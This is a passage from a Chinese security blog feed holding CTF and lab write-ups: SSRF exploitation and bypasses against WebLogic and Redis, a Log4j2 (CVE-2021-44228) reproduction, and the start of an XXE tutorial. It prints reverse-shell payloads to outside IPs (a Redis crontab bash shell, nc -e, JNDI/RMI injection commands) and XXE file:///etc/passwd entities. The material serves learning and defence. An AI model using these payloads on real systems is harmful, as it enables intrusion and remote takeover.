-d</code></pre><p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p><p> <strong>1.查看端口</strong><br> 访问</p><pre><code>/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80//测试http://127.0.0.1:7001：将80替换成7001</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095633-b02c20b4-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095633-b02c20b4-6d72-1.jpg" alt="img"></a><br> not connect，说明80端口未开放<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b05a47d2-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b05a47d2-6d72-1.jpg" alt="img"></a><br> 返回404，说明端口开放<br> <strong>2.探测内网主机存活</strong><br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b09834c0-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b09834c0-6d72-1.jpg" alt="img"></a><br> 说明内网ip为<code>192.168.1.1</code>的主机存活<br> <strong>3.注入HTTP头，利用Redis反弹shell</strong><br> 通过ssrf探测内网中的redis服务器，发现172.22.0.2:6379可以连通<br> 和上边的远程利用几乎一样。<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b0c0075c-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b0c0075c-6d72-1.jpg" alt="img"></a><br> 将反弹shell脚本写入/etc/crontab定时任务</p><pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/121.36.67.230/4444 0&gt;&amp;1\n\n\n\n&quot;config set dir /etc/config set dbfilename crontabsave</code></pre><p>进行url编码</p><pre><code>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</code></pre><p>换行符是“\r\n”换成“%0D%0A”。将url编码后的字符串放在ssrf的域名后面，发送<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095635-b0fc12ec-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095635-b0fc12ec-6d72-1.jpg" alt="img"></a><br> 反弹成功<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095635-b1233318-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095635-b1233318-6d72-1.jpg" alt="img"></a></p><h1 id="SSRF漏洞相关绕过"><a href="#SSRF漏洞相关绕过" class="headerlink" title="SSRF漏洞相关绕过"></a>SSRF漏洞相关绕过</h1><h2 id="1、常用绕过方法"><a href="#1、常用绕过方法" class="headerlink" title="1、常用绕过方法"></a><strong>1、常用绕过方法</strong></h2><p><strong>1.@</strong></p><pre><code>http://abc@127.0.0.1实际上是以用户名abc连接到站点127.0.0.1，同理http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8</code></pre><p>在对@解析域名中，不同的处理函数存在处理差异，如：<br> <code>http://www.aaa.com@www.bbb.com@www.ccc.com</code><br> 在PHP的<code>parse_url</code>中会识别<a href="http://www.ccc.com,而`libcur`l则识别为www.bbb.com/">www.ccc.com，而`libcur`l则识别为www.bbb.com</a><br> <strong>2.利用[::]</strong><br> 可以利用<code>[::]</code>来绕过localhost</p><pre><code>http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></pre><p><strong>3.添加端口号</strong></p><pre><code>http://127.0.0.1:8080</code></pre><p><strong>4.利用短网址</strong><br> <a href="http://tool.chinaz.com/tools/dwz.aspx">站长工具短网址</a><br> <a href="http://dwz.cn/">百度短网址</a><br> <strong>5.利用特殊域名</strong><br> 原理是DNS解析。xip.io可以指向任意域名，即</p><pre><code>127.0.0.1.xip.io，可解析为127.0.0.1</code></pre><p><strong>6.利用DNS解析</strong><br> 在域名上设置A记录，指向127.0.1<br> <strong>7.利用进制转换</strong></p><blockquote><p>127.0.0.1<br> 八进制：0177.0.0.1<br> 十六进制：0x7f.0.0.1<br> 十进制：2130706433</p></blockquote><p><strong>8.句号</strong></p><pre><code>127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></pre><p><strong>9.302跳转</strong><br> 使用<a href="https://tinyurl.com生成302跳转地址/">https://tinyurl.com生成302跳转地址</a></p><h2 id="2、常见限制"><a href="#2、常见限制" class="headerlink" title="2、常见限制"></a>2、常见限制</h2><p><strong>1.限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</strong><br> 采用http基本身份认证的方式绕过。即@<br> <code>http://www.xxx.com@www.xxc.com</code><br> <strong>2.限制请求IP不为内网地址</strong><br> 当不允许ip为内网地址时<br> （1）采取短网址绕过<br> （2）采取特殊域名<br> （3）采取进制转换<br> <strong>3.限制请求只为http协议</strong><br> （1）采取302跳转<br> （2）采取短地址</p><h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><h2 id="file协议读不出文件"><a href="#file协议读不出文件" class="headerlink" title="file协议读不出文件"></a>file协议读不出文件</h2><p><strong>1、权限不够：</strong>当前用户对此文件没有可读权限</p><p><strong>2、路径输错了：</strong>linux系统中，file之后加路径是三个斜线，不能少：比如file:///etc/passwd（其实就是file://和/etc/passwd的组合）</p><p><strong>3、存在open_basedir：</strong>当open_basedir配置有值时，curl_exec不能使用file协议，并不是受open_basedir的值限制某些文件读不了，而是整个file协议都不能用。这是写在php的curl_exec源码里的，目前没找到绕过的方式。</p><p><img src="SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/imgpxy.phpurl=gnp=tmf_xw?046/ggmKrbiSh4fnScisOQkEciAqDHuDaiP4O9yu4IKOIoGIQOcJsNSvHK2ZHqk2EDyWEE0URtdEaiMUsdzaihmE7VJTI3bU/gnp_zibmm/nc.cipq.zibmm//:sptth" alt="img"></p><p><strong>4、php源码不显示：</strong>读取php源码，即使读成功了也不会在浏览器里回显（类似html的注释一样），要在返回包里或者view-source中去看。</p><p><img src="SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/imgpxy.phpurl=gnp=tmf_xw?046/AVOy6sdVuBHuoZ3dYmxMwTBApWe0dmkwyeSQcppVaiav5oIkWuzgY0Ek2EDyWEE0URtdEaiMUsdzaihmE7VJTI3bU/gnp_zibmm/nc.cipq.zibmm//:sptth" alt="img"></p><p><strong>5、不回显的ssrf：</strong>代码没写echo，返回值赋到变量里，读成功了你也看不到。</p><h2 id="gopher协议和dict协议发不出包"><a href="#gopher协议和dict协议发不出包" class="headerlink" title="gopher协议和dict协议发不出包"></a>gopher协议和dict协议发不出包</h2><p>自己在虚拟机搭的测试环境有一个很奇怪的现象，http/s和file协议都能正常使用，但是<strong>不能指定端口</strong>及<strong>使用gopher和dict协议</strong>，否则就只能发出dns请求，却不能建立tcp的连接（dnslog可以收到请求，nc收不到）。</p><p>后面查阅了很多资料，并没有找到明确的答案，只有一个疑似可能的原因：php在编译时没有使用**-with-curlwrappers**参数会导致这个问题。不过这个参数貌似在高版本被去掉了，所以应该只影响低版本php吧。</p><p>在实战中如果遇到这个问题，总不能登目标机器把php重新编译一下吧……（动作太大了，而且都能登机器了还要ssrf有什么用呢），目前没找到什么办法绕过。</p><h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><p>测试一下各协议对特殊符号的支持，中文符号不测试，测试的所有符号如下：</p><p>`~!@#$%^&amp;*()_-+=/|&#39;“;:&lt;&gt;,.?{}[]</p><p><strong>【gopher协议】</strong></p><p><strong>正常符号：</strong>直接传，一次二次url编码都可以</p><p><strong>%</strong> 直接传可以，但后面接16进制字符就会转义，一次url编码后还是不能接16进制，二次url编码可以</p><p><strong>#</strong> 会截断，一次url编码绕不过，二次url编码后可以</p><p><strong>&amp;</strong> 会截断，一次url编码可以，二次url编码也可以</p><p><strong>+</strong> 会变成空格，一次二次url编码后都可以</p><p><strong>【dict协议】</strong></p><p><strong>正常符号：</strong>直接传，一次url编码可以，二次url编码不行（不支持二次解码）</p><p>以下均不支持二次url解码</p><p><strong>%</strong> 直接传可以，后面接16进制不行会转义，一次url编码后可以</p><p><strong>#</strong> 会截断，一次url编码绕不过</p><p><strong>&amp;</strong> 会截断，一次url编码可以</p><p><strong>?</strong> 会截断，一次url编码绕不过</p><p><strong>+</strong> 会变成空格，一次url编码可以</p><p><strong>:</strong> 会变成空格，一次url编码绕不过</p><p><strong>【http/s协议】</strong></p><p><strong>正常符号：</strong>直接传，一次url编码可以，二次url编码不行（不支持二次解码）</p><p>以下均不支持二次url解码</p><p><strong>%</strong> 直接传可以，后面接16进制不行会转义，一次url编码后可以</p><p><strong>#</strong> 会截断，一次url编码绕不过</p><p><strong>&amp;</strong> 会截断，一次url编码可以</p><p><strong>+</strong> 会变成空格，一次url编码可以</p><p><strong>【总结】</strong></p><p>**%#&amp;+**符号容易出问题</p><p><strong>dict协议</strong>额外不支持**?:**两个符号，url编码无法绕过</p><p><strong>一次url编码</strong>可以绕过**%&amp;+<strong>三种符号，不能绕过</strong>#**</p><p>**gopher协议的%**需要编码两次绕过，只一次不行</p><p><strong>gopher</strong>万能协议，<strong>支持二次url解码</strong>，没有绕不过的特殊符号。</p><h1 id="SSRF漏洞防御"><a href="#SSRF漏洞防御" class="headerlink" title="SSRF漏洞防御"></a>SSRF漏洞防御</h1><p>1、禁用不需要的协议(如：<code>file:///</code>、<code>gopher://</code>,<code>dict://</code>等)。仅仅允许http和https请求<br> 2、统一错误信息，防止根据错误信息判断端口状态<br> 3、禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址<br> 4、设置URL白名单或者限制内网IP</p><p>参考:</p><p><a href="http://www.hackdig.com/07/hack-419420.htm">http://www.hackdig.com/07/hack-419420.htm</a></p><p><a href="https://xz.aliyun.com/t/7405#toc-2">https://xz.aliyun.com/t/7405#toc-2</a></p><p>后面我摆烂了，服务器老是坏，等有时间继续复现把，先抄下大佬的文章。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近碰到了挺多SSRF题目的应用，以前学的太浅了，重新学习下，打好基础。&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;SSRF漏洞简介&quot;&gt;&lt;a href=&quot;#SSRF漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;SSRF漏洞简介&quot;&gt;&lt;/a&gt;SSRF漏</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="SSRF" scheme="https://sakurahack-y.github.io/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>log4j2的简单复现</title>
    <link href="https://sakurahack-y.github.io/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/"/>
    <id>https://sakurahack-y.github.io/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-04-23T14:46:44.000Z</published>
    <updated>2022-04-23T16:33:05.602Z</updated>
    
    <content type="html"><![CDATA[<p>之前只是简略看了看这个漏洞，但是并没有及时复现，但是发现这个漏洞hw问的很多，所以还是及时复现一下吧。</p><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p><a href="https://logging.apache.org/log4j/2.x/index.html">Apache Log4j2</a> 是 Apache 软件基金会下的一个<a href="https://github.com/apache/logging-log4j2">开源</a>的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。</p><p>2021 年 12 月 9 日晚，Log4j2 的一个远程代码执行漏洞的利用细节被公开。攻击者使用 <code>$&#123;&#125;</code> 关键标识符触发 JNDI 注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。</p><p>漏洞编号：<a href="https://www.cve.org/CVERecord?id=CVE-2021-44228">CVE-2021-44228</a></p><p>- 漏洞：Log4j2 的 JNDI 功能点无法防御来自攻击者的 ldap 以及其他相关端点的攻击行为。<br>- 严重等级：Critical<br>- Basic CVSS 评分：10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H<br>- 影响版本：all versions from 2.0-beta9 to 2.14.1</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>由于本人代码功底有限，就大概说明下，不进行代码跟进了。</p><p>log4j2提供了一种叫<code>lookups</code>的功能来写日志</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/webp.webp" alt="img"></p><p>而漏洞成因就是log4j2支持<code>Jndi Lookup</code></p><p>日志中包含 <code>$&#123;&#125;</code>,lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。log4j 2将基本的解析都做了实现：</p><p><img src="https://upload-images.jianshu.io/upload_images/27307869-0dd3def6ff8e3f96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/976/format/webp" alt="img"></p><p>常见解析：</p><pre><code>$&#123;ctx:loginId&#125;$&#123;map:type&#125;$&#123;filename&#125;$&#123;date:MM-dd-yyyy&#125;$&#123;docker:containerId&#125;$&#123;docker:containerName&#125;$&#123;docker:imageName&#125;$&#123;env:USER&#125;$&#123;event:Marker&#125;$&#123;mdc:UserId&#125;$&#123;java&#125;$&#123;jndi:logging/context-name&#125;$&#123;hostName&#125;$&#123;docker:containerId&#125;$&#123;k8s&#125;$&#123;log4j&#125;$&#123;main&#125;$&#123;name&#125;$&#123;marker&#125;$&#123;spring&#125;$&#123;sys:logPath&#125;$&#123;web:rootDir&#125;</code></pre><p>JNDI就是提供一个目录系统，并将服务与对象关联起来，可以使用名称来访问对象。而log4j 2中JNDI解析未作限制，可以直接访问到远程对象,如果是自己的服务器还好说，那如果访问到黑客的服务器呢？</p><p>也就是当记录日志的一部分是用户可控时(比如输入用户名和密码时)，就可以构造恶意字符串使服务器记录日志时调用JNDI访问恶意对象，也就是流传出的payload构成：</p><p>${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp}</p><h1 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h1><p><strong>环境1 失败</strong></p><p>环境:<a href="http://vulfocus.io/">http://vulfocus.io/</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423225000889.png" alt="image-20220423225000889"></p><p>测试一下是否存在log4j2,使用网站:<a href="http://dnslog.cn/">http://dnslog.cn/</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230017138.png" alt="image-20220423230017138"></p><pre><code>xxxx?payload=$&#123;jndi:ldap://37zwcc.dnslog.cn/exp&#125;</code></pre><p>有个很重要一点，要对特殊字符进行url编码</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423225440706.png" alt="image-20220423225440706"></p><p>成功回显，证明有漏洞</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230128737.png" alt="image-20220423230128737"></p><p>在vps上运行jndi注入工具:</p><p>链接:<a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230550825.png" alt="image-20220423230550825"></p><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDguMTY2LjIwMS4xNi82NjY3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;108.166.xx.xx&quot;</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423231525347.png" alt="image-20220423231525347"></p><p>nc监听:</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423231620210.png" alt="image-20220423231620210"></p><p>构造payload</p><pre><code>$&#123;jndi:rmi://108.166.201.16:1099/xodh7q&#125;</code></pre><p>还是进行url编码</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000703924.png" alt="image-20220424000703924"></p><p>按理说就可以了，但是我在这个环境并没有成功</p><p><strong>环境2 成功</strong></p><p>感觉上面的环境有点问题，一直无法反弹shell，无论是bin/bash 还是nc都反弹失败了，下面采用bugku环境复现</p><p>url:<a href="https://ctf.bugku.com/challenges/detail/id/340.html">https://ctf.bugku.com/challenges/detail/id/340.html</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000909413.png" alt="image-20220424000909413"></p><p>打一下poc，测试下是否存在漏洞</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001013346.png" alt="image-20220424001013346"></p><p>ojbk，回显了</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001036572.png" alt="image-20220424001036572"></p><p>在Linux上启动服务</p><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;nc 108.166.xx.xx 4444 -e /bin/sh&quot; -A 108.166.xx.xx</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001128315.png" alt="image-20220424001128315"></p><p>直接构造payload</p><pre><code>$&#123;jndi:rmi://108.166.201.16:1099/dwqsay&#125;</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000441276.png" alt="image-20220424000441276"></p><p>成功反弹shell</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000428361.png" alt="image-20220424000428361"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前只是简略看了看这个漏洞，但是并没有及时复现，但是发现这个漏洞hw问的很多，所以还是及时复现一下吧。&lt;/p&gt;
&lt;h1 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h1&gt;&lt;p&gt;&lt;a </summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="log4j2" scheme="https://sakurahack-y.github.io/tags/log4j2/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞学习</title>
    <link href="https://sakurahack-y.github.io/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sakurahack-y.github.io/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-04-19T15:00:37.000Z</published>
    <updated>2022-04-21T19:18:52.365Z</updated>
    
    <content type="html"><![CDATA[<p>自己对这个漏洞不懂原理，以及不会深入利用，就看看师傅的文章，搬运顺便复现部分场景吧。</p><p>[TOC]</p><h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><p><strong>什么是XML</strong></p><p> XML 指可扩展标记语言（EXtensible Markup Language）。<br> XML 的设计宗旨是传输数据，而不是显示数据。<br> XML 是 W3C 的推荐标准。<br> XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br> XML 语言没有预定义的标签。</p><p><strong>XML和HTML的区别</strong></p><p> XML 被设计用来传输和存储数据，其焦点是数据的内容。<br> HTML 被设计用来显示数据，其焦点是数据的外观。<br> HTML 旨在显示信息，而 XML 旨在传输信息。</p><p><strong>XML被用来做什么</strong></p><p>现实生活中一些数据之间往往存在一定的关系。我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。</p><p><strong>XML基本格式</strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;&lt;/book&gt;                                                 &lt;!--book的结束--&gt;&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</code></pre><p><strong>基本语法</strong></p><ul><li>所有 XML 元素都须有关闭标签。</li><li>XML 标签对大小写敏感。</li><li>XML 必须正确地嵌套。</li><li>XML 文档必须有根元素。</li><li>XML 的属性值须加引号。</li></ul><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><p><strong>基本概念</strong></p><p> XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br> DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p><p><strong>实体引用</strong></p><pre><code class="xml">XML元素以形如 &lt;tag&gt;foo&lt;/tag&gt; 的标签开始和结束，如果元素内部出现如&lt; 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot; 替换 &lt; &gt; &amp; &#39; &quot; 。实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。</code></pre><p><strong>示例代码</strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt;PCDATAPCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。被解析的字符数据不应当包含任何&amp;，&lt;，或者&gt;字符，需要用&amp;amp; &amp;lt; &amp;gt;实体来分别替换。CDATACDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开</code></pre><p><strong>DTD元素</strong></p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202150727-65e7882a-14d2-1.png" alt="img"></p><h1 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h1><blockquote><p> 实体是用于定义引用普通文本或特殊字符的快捷方式的变量。<br> 实体引用是对实体的引用。<br> 实体可在内部或外部进行声明。</p></blockquote><p><em>按实体有无参分类，实体分为一般实体和参数实体</em></p><pre><code class="xml">一般实体的声明：&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;引用一般实体的方法：&amp;实体名称;经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。参数实体的声明：&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;引用参数实体的方法：%实体名称;经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。</code></pre><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><p>按实体使用方式分类，实体分为内部声明实体和引用外部实体</p><p><strong>内部实体</strong></p><pre><code class="xml">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre><p><strong>内部实体示例代码：</strong></p><pre><code class="xml">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY writer &quot;Dawn&quot;&gt;    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;©right;&lt;/test&gt;</code></pre><p><strong>外部实体</strong></p><p>外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p><pre><code class="xml">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;或者&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre><p><strong>外部实体示例代码:</strong></p><pre><code class="xml">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;file;©right;&lt;/author&gt;</code></pre><p>外部实体可支持http、file等协议。不同程序支持的协议不同：</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202150935-b26e4a30-14d2-1.png" alt="img"></p><p> PHP支持的协议会更多一些，但需要一定的扩展：</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202151023-cf02c3ba-14d2-1.png" alt="img"></p><p><strong>PHP引用外部实体，常见的利用协议</strong>：</p><pre><code class="xml">file://文件绝对路径 如：file:///etc/passwdhttp://url/file.txtphp://filter/read=convert.base64-encode/resource=xxx.php</code></pre><p><strong>参数实体+外部实体</strong></p><pre><code class="xml">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></pre><p>示例代码：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  %file;]&gt;%file(参数实体)是在DTD中被引用的，而&amp;file;是在xml文档中被引用的。</code></pre><h1 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h1><blockquote><p> XML的设计宗旨是传输数据，而非显示数据。<br> XML注入是一种古老的技术，通过利用闭合标签改写XML文件实现的。</p></blockquote><p><strong>XML注入简介</strong></p><p> XML是一种数据组织存储的数据结构方式，安全的XML在用户输入生成新的数据时候应该只能允许用户接受的数据，需要过滤掉一些可以改变XML标签也就是说改变XML结构插入新功能（例如新的账户信息，等于添加了账户）的特殊输入，如果没有过滤，则可以导致XML注入攻击。</p><p><strong>XML注入前提</strong></p><p> （1）用户能够控制数据的输入<br> 